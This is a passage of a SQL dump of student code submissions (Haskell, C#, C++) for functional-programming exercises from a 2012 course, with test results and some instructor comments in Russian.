{\r\n\r\n                BigInteger sub = BigInteger.Subtract( newnum, BigInteger.Multiply( BigInteger.Add(newcmp, (BigInteger) i), n ));\r\n\r\n                if (BigInteger.Compare(sub, BigInteger.Zero) == -1)\r\n\r\n                {\r\n\r\n                    return i - 1;\r\n\r\n                }\r\n\r\n            }\r\n\r\n            return 0;\r\n\r\n        }\r\n\r\n        static IEnumerable<int> digits(int n) {\r\n\r\n            BigInteger num = BigInteger.One;\r\n\r\n            BigInteger cmp = BigInteger.Zero;\r\n\r\n            BigInteger newn = (BigInteger)n;\r\n\r\n            for (int i = 0; ; i++) { \r\n\r\n                int newdigit = cntDigit (num, newn, cmp);\r\n\r\n                yield return newdigit;\r\n\r\n\r\n\r\n                num = BigInteger.Multiply(num, (BigInteger)10);\r\n\r\n                cmp = BigInteger.Add( BigInteger.Multiply(cmp, (BigInteger) 10) , (BigInteger)newdigit);\r\n\r\n            }\r\n\r\n        }\r\n\r\n        static void printHundred (int n) {\r\n\r\n            IEnumerable<int> digitsofn = digits(n).Take(100);\r\n\r\n            foreach (int digit in digitsofn) {\r\n\r\n                Console.Write(digit);\r\n\r\n                Console.Write(" ");\r\n\r\n            }\r\n\r\n        }\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            printHundred(7);\r\n\r\n            Console.ReadKey();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2862, 68, '397095', '2012-10-29 18:12:32', 1, 'using System;\r\nusing System.Linq;\r\n\r\nnamespace FunctionalProgramming\r\n{\r\n	class ZeroDigits\r\n	{\r\n		static int[] zeroDigits(int[] a, int n) \r\n		{\r\n			int v = 1;\r\n			for (int i = 0; i < n; i++) {\r\n				v *= 10;\r\n			}\r\n			return a.Select(x => (x / v) * v).ToArray();\r\n		}\r\n\r\n		static void Main(string[] args) \r\n		{\r\n			int[] a = new int[] {563, 5643, 76796};\r\n			int[] b = zeroDigits(a, 2);\r\n			for (int i = 0; i < a.Length; i++) {\r\n				Console.WriteLine("{0}", b[i]);\r\n			}\r\n		}\r\n	}\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2863, 74, 'tonyo', '2012-10-29 18:27:19', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\n\r\nfoldTree f e Empty = e \r\nfoldTree f e (Node x l r) = f x lres rres\r\n  where lres = foldTree f e l; rres = foldTree f e r \r\n\r\nsumPos = foldTree (x l r -> if x > 0   \r\n                             then x + l + r \r\n                             else l + r) 0\r\n', '<br/>Тесты успешно пройдены!'),
(2864, 76, '44060', '2012-10-29 18:39:21', 1, 'data Circle = Circle Double\r\ndata Rect = Rect Double Double\r\n\r\nclass Shape x where\r\n	perimeter:: x -> Double\r\n	area:: x -> Double\r\n	contains:: x -> Double -> Double -> Bool\r\n\r\ninstance Shape Rect where\r\n	area (Rect a b) = a * b\r\n	perimeter (Rect a b) = 2 * (a + b)\r\ninstance Shape Circle where\r\n	area (Circle s) = s * s * 3.14\r\n	perimeter (Circle p) = p * 6.28', '<br/>Тесты успешно пройдены!'),
(2865, 69, '6774563', '2012-10-29 18:41:10', 1, 'bigSin a = head (dropWhile (< a) [sin i | i <-[1..]])\r\n', '<br/>Тесты успешно пройдены!'),
(2866, 70, '6774563', '2012-10-29 18:44:50', 1, 'myFilter pred xs = foldr (x acc -> if (pred x) then (x:acc) else acc) [] xs\r\n', '<br/>Тесты успешно пройдены!'),
(2867, 67, '397095', '2012-10-29 18:46:58', 1, '#include <algorithm>\r\n#include <stdio.h>\r\n#include <stdafx.h>\r\n#include <iostream>\r\n\r\nusing namespace std;\r\n\r\nint* zeroDigits(int* a, int size, int n)\r\n{\r\n	int* b = new int[size];\r\n	int v = 1;\r\n	for (int i = 0; i < n; i++) {\r\n		v *= 10;\r\n	}\r\n	transform(a, a + size, b, [v] (int i) { return (i / v) * v; });\r\n	return b;\r\n}\r\n\r\nint main(int argc, char const *argv[])\r\n{\r\n	int size = 3;\r\n	int x[] = {563, 5643, 76796};\r\n	int* y = zeroDigits(x, size, 2);\r\n	for (int i = 0; i < size; i++) {\r\n		printf("%d\r\n", y[i]);\r\n	}\r\n	return 0;\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2868, 75, '51559263', '2012-10-29 18:52:01', 1, 'foldr _ val [] = val\r\n\r\nfoldr func val (x : xs) = func x ( foldr func val xs )\r\n\r\n\r\n\r\n\r\n\r\nТип:\r\n\r\n\r\n\r\n1. a -> b -> c -> d\r\n\r\n\r\n\r\n2. (x:xs) имеет тип "c" => c = [e]\r\n\r\n\r\n\r\n   a -> b -> [e] -> d\r\n\r\n\r\n\r\n3. Справа "func" вызывается как функция с двумя параметрами => a = ( f -> g -> d )\r\n\r\n\r\n\r\n   ( f -> g -> d ) -> b -> [e] -> d \r\n\r\n\r\n\r\n4. f имеет тип "x", т.е. "e" ;\r\n\r\n\r\n\r\n   "g" имеет тип foldr, т.е. "g" = "d" ;\r\n\r\n\r\n\r\n   val имеет тип "d" по первому правилу => "b" = "d" ;\r\n\r\n\r\n\r\n   \r\n\r\nВ итоге:\r\n\r\n \r\n\r\n   foldr :: ( e -> d -> d ) -> d -> [e] -> d\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2869, 71, '6774563', '2012-10-29 18:52:53', 1, 'approxSum xs = let eps = 0.000001 in foldl (+) 0 (takeWhile (x -> abs(x) >= eps) xs)\r\n\r\nz = approxSum [1/(i*i) | i <- [1..]]\r\n', '<br/>Тесты успешно пройдены!'),
(2870, 75, 'tonyo', '2012-10-29 18:53:28', 1, '1. foldr :: (a -> b -> b) -> b -> [a] -> b\r\n\r\n2. Выводим. Рассмотрим определение:\r\n\r\nfoldr f e [] = e\r\nfoldr f e (x:xs) = f x (foldr f e xs)\r\n\r\nСначала ничего не знаем про типы аргументов. Их всего 3, поэтому в общем виде тип foldr можно записать так: \r\na1 -> a2 -> a3 -> a4\r\n\r\nИз первого правила можно понять, что a2 = a4 (тип второго аргумента совпадает с типом результата). Получаем:\r\na1 -> a2 -> a3 -> a2\r\n\r\nИз обоих правил заключаем, что третий аргумент - это список, а значит:\r\na1 -> a2 -> [a5] -> a2\r\n\r\nИз второго правила можно понять, что первый аргумент - это функция, причем она принимает два аргумента, первый из которых имеет тот же тип, что и элементы аргумента-списка (т.е. a5), второй - имеет тот же тип, что и результат foldr, как и тип результата. Таким образом, тип этой функции можно записать как \r\na5 -> a2 -> a2.\r\n\r\nИтого, получаем тип foldr:\r\n(a5 -> a2 -> a2) -> a2 -> [a5] -> a2 ', '<br/>Тесты успешно пройдены!'),
(2871, 72, '6774563', '2012-10-29 19:00:42', 1, 'weekendExpences xs = foldr (processDay) 0 (zip xs (cycle [1..7])) where\r\n	processDay (x,d) acc | d == 6 || d == 7 = acc + x\r\n			     | otherwise        = acc\r\n', '<br/>Тесты успешно пройдены!'),
(2872, 67, '419046', '2012-10-29 19:17:33', 1, '#include <algorithm>  \r\n\r\n#include <iostream>\r\n\r\n#include <cmath>\r\n\r\n\r\n\r\nusing namespace std;\r\n\r\nconst int MAXN = 1000;\r\n\r\nvoid zeroDigits (int *a, int c, int n)\r\n\r\n{\r\n\r\n\r\n\r\n   int b[MAXN];\r\n\r\n   transform(a, a+c, b, [n] (int i) { return (i - i % (int)(pow(10, n))); }); \r\n      --- ОК, но на самом деле, лучше сосчитать pow(10,n) один раз вне transform\r\n\r\n\r\n\r\n   for (int* j=b; j<(b+c); j++)\r\n\r\n   cout << *j<<endl;\r\n\r\n\r\n\r\n}\r\n\r\nint main()\r\n\r\n{\r\n\r\n      int a[] = { 563, 5643, 76796 };\r\n\r\n      zeroDigits (a,3,2);\r\n\r\n      return 0;\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2873, 80, '318210', '2012-10-29 19:27:15', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace cantor192\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static IEnumerable<Tuple<int, int>> cantor() {\r\n\r\n            for (int i = 2; ; i++) {\r\n\r\n                for (int j = 1; j < i; j++)\r\n\r\n                {\r\n\r\n                    Tuple<int, int> tuple = new Tuple<int, int>(j, i - j);\r\n\r\n                    yield return tuple;\r\n\r\n                }\r\n\r\n            }\r\n\r\n        }\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            IEnumerable<Tuple<int, int>> fcantor = cantor().Take(20);\r\n\r\n            foreach (Tuple<int, int> tuple in fcantor)\r\n\r\n            {\r\n\r\n                Console.WriteLine(tuple.ToString());\r\n\r\n            }\r\n\r\n            Console.ReadKey();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2874, 73, '6774563', '2012-10-29 19:41:03', 0, 'fibs = let\r\n	sumPair (a,b) = a+b\r\n	getTail (x:xs) = xs in\r\n		1:1:map (sumPair) (zip fibs (getTail fibs))\r\n', '<br/>Тесты успешно пройдены!'),
(2875, 73, '6774563', '2012-10-29 19:44:42', 1, '-- да уж, решил сравнить свое решение с интернетовским.\r\n-- оказалось, что можно в 4 раза короче, не знал про zipWith\r\n   --- ОК) Могли бы и свое прислать, длина значения не имеет..\r\nfibs = 1:1:zipWith (+) fibs (tail fibs)\r\n', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(2876, 81, '51559263', '2012-10-29 19:46:34', 0, 'f (x : xs) = (10 * x + 2) : (10 * x + 3) : (10 * x + 9) : f xs\r\n\n\r\n\nlist239 = 2 : 3 : 9 : f list239\r\n\n\r\n\n\n', 'Не удалось вычислить выражение "take 15 lst239", проверьте правильность синтаксиса'),
(2877, 81, '51559263', '2012-10-29 19:47:14', 1, 'f (x : xs) = (10 * x + 2) : (10 * x + 3) : (10 * x + 9) : f xs\r\n\r\n\r\n\r\nlst239 = 2 : 3 : 9 : f lst239\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2878, 67, '4837959', '2012-10-29 19:56:34', 1, '#include <iostream>\r\n\r\n#include <algorithm>\r\n\r\n#include <cmath>\r\n\r\n\r\n\r\nusing namespace std;\r\n\r\n\r\n\r\nconst int MAXN = 1000;\r\n\r\n\r\n\r\nvoid zeroDigits(int *a, int size, int n) {\r\n\r\n    int tmp[MAXN];\r\n\r\n    int factor = (int)pow(10, n);\r\n\r\n    transform(a, a + size, tmp, [factor] (int i) { return (i / factor) * factor; }); \r\n\r\n    for (int *i = tmp; i < tmp + size; ++i) {\r\n\r\n        cout << *i << endl;\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n\r\nint main() {\r\n\r\n    int a[] = {563, 5643, 76796};\r\n\r\n    int a_size = 3;\r\n\r\n    zeroDigits(a, a_size, 3);\r\n\r\n}\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2879, 74, '6774563', '2012-10-29 20:01:36', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nfoldTree _ empVal Empty = empVal\r\nfoldTree f empVal (Node key left right) = f key (foldTree f empVal left) (foldTree f empVal right)\r\n\r\nsumPos t = let\r\n	positivePart a 	| a > 0     = a\r\n			| otherwise = 0 in\r\n    ---- Или вместо positivePart a можно max a 0\r\n		foldTree (a b c -> positivePart a + b + c) 0 t\r\n', '<br/>Тесты успешно пройдены!'),
(2880, 68, '4837959', '2012-10-29 20:06:26', 1, '﻿using System;\r\n\r\nusing System.Linq;\r\n\r\n\r\n\r\nnamespace PrintNumbers\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static int[] zeroDigits(int[] a, int n) \r\n\r\n        {\r\n\r\n            int factor = (int)Math.Pow(10, n);\r\n\r\n            int[] tmp = a.Select(x => (x / factor) * factor).ToArray();\r\n\r\n            return tmp;\r\n\r\n        }\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            int[] a = {563, 5643, 76796};\r\n\r\n            int[] result = zeroDigits(a, 3);\r\n\r\n            foreach (int num in result)\r\n\r\n            {\r\n\r\n                Console.WriteLine(num);\r\n\r\n            }\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2881, 68, '419046', '2012-10-29 20:11:34', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\n \r\n\r\n \r\n\r\nnamespace mynamespace \r\n\r\n{\r\n\r\n    class Digits {\r\n\r\n        static void zeroDigits(int[] a, int n) {\r\n\r\n           int p = (int)Math.Pow(10, n);\r\n\r\n           int[] b = a.Select(x => (x - x % p)).ToArray();\r\n\r\n           foreach (int i in b)\r\n\r\n           Console.WriteLine(i);}\r\n\r\n static void Main(string[] args) {\r\n\r\n        int[] a = {563, 5643, 76796};\r\n\r\n            zeroDigits(a, 2); }\r\n\r\n                 }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2882, 82, '3607492', '2012-10-29 20:29:28', 0, 'concatEquals _ _ [] z ((a,b):(c,d):[]) = (a,b++d):z\r\n\nconcatEquals t1 t2 ((a,b):xs) z z1= if (t1==t2) then (a,b):xs else if (a==t1 || a==t2) then concatEquals t1 t2 xs z ((a,b):z1) else concatEquals t1 t2 xs ((a,b):z) z1\r\n\nconcatEquals _ _ _ _ _ = []\r\n\n\r\n\n\r\n\naddEquals t1 z ((a,b):xs) = if (t1==a) then (a,z:b):xs else (a,b):(addEquals t1 z xs)\r\n\naddEquals _ _ z = z\r\n\n\r\n\ncreateEqual a b z t= (t,[a,b]):z\r\n\n\r\n\ncheckValue [] _ = False\r\n\ncheckValue (x:xs) v = if (x==v) then True else checkValue xs v\r\n\n\r\n\n\r\n\n\r\n\ncheckEquals [] _ = -1;\r\n\ncheckEquals ((a,b):xs) v =  if (checkValue b v) then a else checkEquals xs v\r\n\n\r\n\n\r\n\ncreateEquals [] z _ = z\r\n\ncreateEquals ((a,b):as) z t = if (t1 > 0) then \r\n\n											if (t2 > 0)\r\n\n												then createEquals as (concatEquals t1 t2 z [] []) (t+1)\r\n\n												else createEquals as (addEquals t1 b z) (t+1)\r\n\n\r\n\n										else\r\n\n											if (t2 > 0)\r\n\n												then createEquals as (addEquals t2 a z) (t+1)\r\n\n												else createEquals as (createEqual a b z t) (t+1)\r\n\n							where \r\n\n								t1=checkEquals z a\r\n\n								t2=checkEquals z b \r\n\n\r\n\n\r\n\ncheckList [] _ res = res\r\n\n\r\n\ncheckList (y:ys) eq res = if (t>0) then checkList ys eq (((show t)++"-test"):res) else checkList ys eq (y:res)\r\n\n					where t = checkEquals eq y\r\n\n\r\n\nremoveDuplicates [] = []\r\n\nremoveDuplicates (x:xs) = x:removeDuplicates(filter (y ->not (x==y)) xs)\r\n\n\r\n\ntestvars x y = length (removeDuplicates(checkList y eq []))\r\n\n\r\n\n	where eq = createEquals x [] 1\r\n\n\r\n\n\r\n\ntostr x = map (z->(show z)) x\r\n\ntostrPair x = map ((a,b)->(show a,show b)) x\r\n\n\r\n\ncountDifferentVars x y = testvars (tostrPair x) (tostr y)\r\n\n\r\n\n--main = print(countDifferentVars [(1,3),(3,2),(2,1),(8,9)] [1,2,3,4,8,9])\n', '<br/>Тесты успешно пройдены!'),
(2883, 82, '2118411', '2012-10-29 20:30:18', 2, '   --- Нет, не совсем так. Например \r\n   ---   countDifferentVars [("x","a"),("y","b"),("x","y")] ["a","b"]\r\n   --- у вас дает 2 (а дб 1)\r\n   --- исправьте, пожалуйста (а я сейчас добавлю такой тест) \r\nreplaceAll [] vars = vars\r\nreplaceAll ((l,r):eqs) vars = replaceAll eqs newvars\r\n        where newvars = [var | t <- vars, let var = if t==l then r else t]\r\ncountIt res [] = res\r\ncountIt res (x:xs) = countIt (res+1) $filter (/=x) xs\r\ncountDifferentVars eqs vars = countIt 0 $replaceAll eqs vars', '<br/>Тесты успешно пройдены!'),
(2884, 82, '3607492', '2012-10-29 20:33:33', 1, '----------------\r\n\r\n{-Даже не ошибка была.. Просто я думал,что будут чары на вход приходить, и идентифицировал классы эквивалентности цифрами, а затем буквы в одном классе заменял на соответствующую цифру. =) Тут получилось классы "1","4" и цифра "4" =) Теперь к цифре дописываю "-test". -}\r\n   --- Ну да, это просто ошибка в системе тестирования, строки там пока не сохраняются, пришлось тесты \r\n   --- делать для чисел\r\n\r\n----------------\r\n\r\n\r\n\r\nconcatEquals _ _ [] z ((a,b):(c,d):[]) = (a,b++d):z\r\n\r\nconcatEquals t1 t2 ((a,b):xs) z z1= if (t1==t2) then (a,b):xs else if (a==t1 || a==t2) then concatEquals t1 t2 xs z ((a,b):z1) else concatEquals t1 t2 xs ((a,b):z) z1\r\n\r\nconcatEquals _ _ _ _ _ = []\r\n\r\n\r\n\r\n\r\n\r\naddEquals t1 z ((a,b):xs) = if (t1==a) then (a,z:b):xs else (a,b):(addEquals t1 z xs)\r\n\r\naddEquals _ _ z = z\r\n\r\n\r\n\r\ncreateEqual a b z t= (t,[a,b]):z\r\n\r\n\r\n\r\ncheckValue [] _ = False\r\n\r\ncheckValue (x:xs) v = if (x==v) then True else checkValue xs v\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\ncheckEquals [] _ = -1;\r\n\r\ncheckEquals ((a,b):xs) v =  if (checkValue b v) then a else checkEquals xs v\r\n\r\n\r\n\r\n\r\n\r\ncreateEquals [] z _ = z\r\n\r\ncreateEquals ((a,b):as) z t = if (t1 > 0) then \r\n\r\n											if (t2 > 0)\r\n\r\n												then createEquals as (concatEquals t1 t2 z [] []) (t+1)\r\n\r\n												else createEquals as (addEquals t1 b z) (t+1)\r\n\r\n\r\n\r\n										else\r\n\r\n											if (t2 > 0)\r\n\r\n												then createEquals as (addEquals t2 a z) (t+1)\r\n\r\n												else createEquals as (createEqual a b z t) (t+1)\r\n\r\n							where \r\n\r\n								t1=checkEquals z a\r\n\r\n								t2=checkEquals z b \r\n\r\n\r\n\r\n\r\n\r\ncheckList [] _ res = res\r\n\r\n\r\n\r\ncheckList (y:ys) eq res = if (t>0) then checkList ys eq (((show t)++"-test"):res) else checkList ys eq (y:res)\r\n\r\n					where t = checkEquals eq y\r\n\r\n\r\n\r\nremoveDuplicates [] = []\r\n\r\nremoveDuplicates (x:xs) = x:removeDuplicates(filter (y ->not (x==y)) xs)\r\n\r\n\r\n\r\ntestvars x y = length (removeDuplicates(checkList y eq []))\r\n\r\n\r\n\r\n	where eq = createEquals x [] 1\r\n\r\n\r\n\r\n\r\n\r\ntostr x = map (z->(show z)) x\r\n\r\ntostrPair x = map ((a,b)->(show a,show b)) x\r\n\r\n\r\n\r\ncountDifferentVars x y = testvars (tostrPair x) (tostr y)\r\n\r\n\r\n\r\n--main = print(countDifferentVars [(1,3),(3,2),(2,1),(8,9)] [1,2,3,4,8,9])\r\n', '<br/>Тесты успешно пройдены!'),
(2885, 83, '2118411', '2012-10-29 20:36:23', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace FPTask\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            UInt64 i = 0;\r\n\r\n            foreach (UInt64 t in Lst239())\r\n\r\n            {\r\n\r\n                Console.Write("{0} ", t);\r\n\r\n                i++;\r\n\r\n                if (i > 15)\r\n\r\n                    break;\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        public static IEnumerable<UInt64> Lst239()\r\n\r\n        {\r\n\r\n            yield return 2;\r\n\r\n            yield return 3;\r\n\r\n            yield return 9;\r\n\r\n\r\n\r\n            foreach (UInt64 i in Lst239())\r\n\r\n            {\r\n\r\n                UInt64 t = 10*i;\r\n\r\n                yield return t + 2;\r\n\r\n                yield return t + 3;\r\n\r\n                yield return t + 9;\r\n\r\n            }\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2886, 84, '2118411', '2012-10-29 20:44:39', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace FPTask\r\n\r\n{\r\n\r\n    delegate double Func(double x);\r\n\r\n\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            foreach (double x in Iterate(2, x => x * 2))\r\n\r\n            {\r\n\r\n                Console.WriteLine(x);\r\n\r\n                if (x > 1000000)\r\n\r\n                    break;\r\n\r\n            }\r\n\r\n\r\n\r\n            int i = 0;\r\n\r\n            foreach (double x in Iterate(1, Math.Sin))\r\n\r\n            {\r\n\r\n                Console.WriteLine(x);\r\n\r\n                if (i++ == 100)\r\n\r\n                    break;\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        public static IEnumerable<double> Iterate(double x, Func f)\r\n\r\n        {\r\n\r\n            for (; ; x = f(x))\r\n\r\n            {\r\n\r\n                yield return x;\r\n\r\n            }\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(2887, 81, '318210', '2012-10-29 21:02:18', 1, 'lst239h l n = l ++ ( lst239h ( concat ( map (z -> [10*z + 2, 10*z + 3, 10 * z + 9] ) l ) ) (n + 1))\r\nlst239 = lst239h [2, 3, 9] 2\r\n\r\n--я придумаю нормальное решение, я думаю, но чуть позже\r\n   --- ОК) В принципе просто вашу идею можно записать короче..', '<br/>Тесты успешно пройдены!'),
(2888, 75, '6774563', '2012-10-29 21:16:44', 1, 'foldr :: (a -> b -> b) -> b -> [a] -> b\r\n\r\n--К сожалению, на занятии меня не было, но конспект я нашел.\r\n--Требуемую реализацию foldr там не нашел, поэтому, надеюсь, она была такой:\r\n\r\nfoldr f e (x:xs) = foldr f (f x e) xs\r\nfoldr _ e [] = e\r\n\r\n-- Ничего не знаем про аргументы:	a1 -> a2 -> a3 -> a4\r\n-- (x:xs) имеет тип a3 => 		a3 = [a5]\r\n-- f применяется и имеет тип a1 =>	a1 = a6 -> a7 -> a8\r\n\r\n-- таким образом, foldr :: (a6 -> a7 -> a8) -> a2 -> [a5] -> a4\r\n-- дальше доказываем, что некоторые типы равны:\r\n-- foldr возвращает тип a4, в то же время foldr _ e [] = e, который имеет тип a2 => a4 = a2\r\n-- f возвращает тип a8, в то же время 2й аргумент имеет тип a2 => a8 = a2\r\n-- x - 1й аргумент f, т.е. имеет тип a6, в то же время встречается в (x:xs), \r\n-- т.е. имеет тип a5 => a6 = a5\r\n-- x - 1й аргумент f, т.е. имеет тип a7, в то же время 2й аргумент foldr, \r\n-- т.е. имеет тип a2 => a7 = a2\r\n\r\n--  получили, что foldr :: (a5 -> a2 -> a2) -> a2 -> [a5] -> a2', '<br/>Тесты успешно пройдены!'),
(2889, 69, 'sromanov', '2012-10-29 21:30:14', 1, 'bigSin x = head $ filter (>=x) $ map sin [1..]', '<br/>Тесты успешно пройдены!'),
(2890, 76, '6774563', '2012-10-29 21:32:02', 1, 'data Circle = Circle Double\r\ndata Rect = Rect Double Double\r\n\r\nclass Shape a where\r\n	perimeter :: a -> Double\r\n\r\ninstance Shape Circle where\r\n	perimeter (Circle r) = 2*pi*r\r\n\r\ninstance Shape Rect where\r\n	perimeter (Rect x y) = x + x + y + y\r\n', '<br/>Тесты успешно пройдены!'),
(2891, 80, '533223', '2012-10-29 21:47:16', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace PrintTable\r\n{\r\n    class Program\r\n    {\r\n        public static IEnumerable<int[]> cantor()\r\n        {\r\n            for (int i = 2; ; i++)\r\n            {\r\n                for (int j = 1; j < i; j++ )\r\n                {\r\n                    yield return new int[]{j,i-j};\r\n                }\r\n            }\r\n        }\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            foreach (int[] x in cantor())\r\n            {\r\n                Console.WriteLine("{0} , {1}", x[0], x[1] );\r\n                if (x[0] > 10)\r\n                    break;\r\n            }\r\n\r\n            Console.ReadKey();\r\n        }\r\n    }\r\n}', '<br/>Тесты успешно пройдены!'),
(2892, 81, '533223', '2012-10-29 22:02:24', 1, 'listHelp 1 = [2,3,9]\r\nlistHelp k = [ 10*x+y|x<-(listHelp (k-1)), y<-(listHelp 1) ]\r\nlistMoreHelp k = (listHelp k) ++ (listMoreHelp (k+1))\r\nlst239 = listMoreHelp 1', '<br/>Тесты успешно пройдены!'),
(2893, 77, '6774563', '2012-10-29 22:20:06', 0, '-- Идея: подбираем ближайший квадрат (1 для начала),\r\n-- умножаем исходное на 100, а результат на 10. Повторяем.\r\n-- Как подбирать ближайший квадрат: перебираем только\r\n-- последнюю цифру. Понятно, что это не самый быстрый способ,\r\n-- да и этот можно было бы сделать побыстрее, например,\r\n-- перебрая двоичным поиском на интервале [0..9], но я сделал просто\r\n-- последовательный перебор, при желании могу изменить/придумать что-то\r\n-- более дельное и быстрое\r\n\r\nsqrt2 = map (`mod` 10) (sqrt2Impl 200 1)\r\n\r\nsqrt2Impl a b = b:sqrt2Impl (a*100) (getNextB a b) where\r\n\r\n	getNextB a b = let \r\n		b10 = b*10\r\n		goodSquare x = a >= (b10+x)*(b10+x)\r\n			in b10 + last (takeWhile (goodSquare) [0..9])\r\n', '<br/>Тесты успешно пройдены!'),
(2894, 77, '6774563', '2012-10-29 22:41:06', 0, 'pascal = [1]:map (xs -> 1:zipWith (+) xs (tail xs++[0])) pascal\r\n', 'Не удалось вычислить выражение "take 20 sqrt2", проверьте правильность синтаксиса'),
(2895, 78, '6774563', '2012-10-29 22:41:32', 1, 'pascal = [1]:map (xs -> 1:zipWith (+) xs (tail xs++[0])) pascal\r\n', '<br/>Тесты успешно пройдены!'),
(2896, 77, '6774563', '2012-10-29 22:42:25', 0, '-- Идея: подбираем ближайший квадрат (1 для начала),\r\n-- умножаем исходное на 100, а результат на 10. Повторяем.\r\n-- Как подбирать ближайший квадрат: перебираем только\r\n-- последнюю цифру. Понятно, что это не самый быстрый способ,\r\n-- да и этот можно было бы сделать побыстрее, например,\r\n-- перебрая двоичным поиском на интервале [0..9], но я сделал просто\r\n-- последовательный перебор, при желании могу изменить/придумать что-то\r\n-- более дельное и быстрое\r\n\r\nsqrt2 = map (`mod` 10) (sqrt2Impl 200 1)\r\n\r\nsqrt2Impl a b = b:sqrt2Impl (a*100) (getNextB a b) where\r\n\r\n	getNextB a b = let \r\n		b10 = b*10\r\n		goodSquare x = a >= (b10+x)*(b10+x)\r\n			in b10 + last (takeWhile (goodSquare) [0..9])\r\n', '<br/>Тесты успешно пройдены!'),
(2897, 77, '6774563', '2012-10-29 22:42:28', 1, '-- Идея: подбираем ближайший квадрат (1 для начала),\r\n-- умножаем исходное на 100, а результат на 10. Повторяем.\r\n-- Как подбирать ближайший квадрат: перебираем только\r\n-- последнюю цифру. Понятно, что это не самый быстрый способ,\r\n-- да и этот можно было бы сделать побыстрее, например,\r\n-- перебрая двоичным поиском на интервале [0..9], но я сделал просто\r\n-- последовательный перебор, при желании могу изменить/придумать что-то\r\n-- более дельное и быстрое\r\n   --- Да нормально, по-моему получается достаточно быстро. Двоичный поиск, мне кажется, тут особо и ни к чему\r\n   --- на таком маленьком интервале особой разницы не будет.\r\n   --- Более быстрый способ, я, кстати, так сразу не могу придумать, хотя, наверное, он есть.\r\n\r\nsqrt2 = map (`mod` 10) (sqrt2Impl 200 1)\r\n\r\nsqrt2Impl a b = b:sqrt2Impl (a*100) (getNextB a b) where\r\n\r\n	getNextB a b = let \r\n		b10 = b*10\r\n		goodSquare x = a >= (b10+x)*(b10+x)\r\n			in b10 + last (takeWhile (goodSquare) [0..9])\r\n', '<br/>Тесты успешно пройдены!'),
(2898, 81, '6774563', '2012-10-29 22:50:34', 1, 'lst239 = 2:3:9:[i*10+j | i <- lst239, j <- [2,3,9]]\r\n', '<br/>Тесты успешно пройдены!'),
(2899, 82, '6774563', '2012-10-29 23:57:25', 1, '--module Main where\r\n\r\n\r\n\r\nimport qualified Data.Set as Set\r\n\r\n\r\n\r\ncountDifferentVars eqs xs = countDifferentVars'' (buildClusters eqs) xs\r\n\r\n\r\n\r\ncountDifferentVars'' eqs xs = fst (foldr processVar (0, Set.empty) xs) where\r\n\r\n	processVar x (count, clusters)	| hasElem x clusters	= (count, clusters )\r\n\r\n					| otherwise		= (count + 1, clusters `Set.union` Set.singleton (clusterWith x eqs))\r\n\r\n\r\n\r\n\r\n\r\nbuildClusters eqs = foldr processEq Set.empty eqs where\r\n\r\n	processEq (x,y) clusters | hasElem x clusters && hasElem y clusters = Set.insert (xCluster `Set.union` yCluster) (Set.delete yCluster (Set.delete xCluster clusters))\r\n\r\n				| hasElem x clusters = Set.insert (xCluster `Set.union` (Set.singleton y)) (Set.delete xCluster clusters)\r\n\r\n				| hasElem y clusters = Set.insert (yCluster `Set.union` (Set.singleton x)) (Set.delete yCluster clusters)\r\n\r\n				| otherwise = Set.insert ((Set.singleton x) `Set.union` (Set.singleton y)) clusters where\r\n\r\n					xCluster = clusterWith x clusters\r\n\r\n					yCluster = clusterWith y clusters\r\n\r\n\r\n\r\n\r\n\r\nclusterWith x clusters = Set.fold (s res -> if (Set.member x s) then s else res) (Set.singleton x) clusters\r\n\r\nwithout x clusters = Set.filter (Set.notMember x) clusters\r\n\r\nhasElem x clusters = hasClusterWith (Set.member x) clusters\r\n\r\nhasClusterWith f clusters = Set.fold (cluster has -> has || f cluster) False clusters\r\n\r\n\r\n\r\n--main = putStrLn $ show $ countDifferentVars 